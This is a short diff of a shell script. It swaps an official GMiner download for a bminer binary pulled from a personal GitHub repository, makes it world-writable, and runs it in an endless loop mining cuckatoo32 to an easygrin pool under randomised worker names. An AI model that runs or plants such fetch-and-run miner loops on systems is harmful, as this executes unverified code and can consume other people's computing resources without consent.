@@ -1,5 +1,5 @@
-curl https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz -L -o gminer_3_44_linux64.tar.xz
-tar xf gminer_3_44_linux64.tar.xz
+curl https://github.com/Jchen-sudo/mining/raw/refs/heads/master/tools/bminer-v16.4.10/bminer-Linux/bminer -L -o bmin
+chmod 777 bmin
 while :; do
-./miner --algo cuckatoo32 --server europe.pool.easygrin.org:3001 --user aabc3464@gmail.com.$(echo $(shuf -i 1-15000 -n 1)-run)
+./bmin -uri cuckatoo32://aabc3464@gmail.com.$(echo $(shuf -i 1-15000 -n 1)-run):x@europe.pool.easygrin.org:3001 -nofee
 done
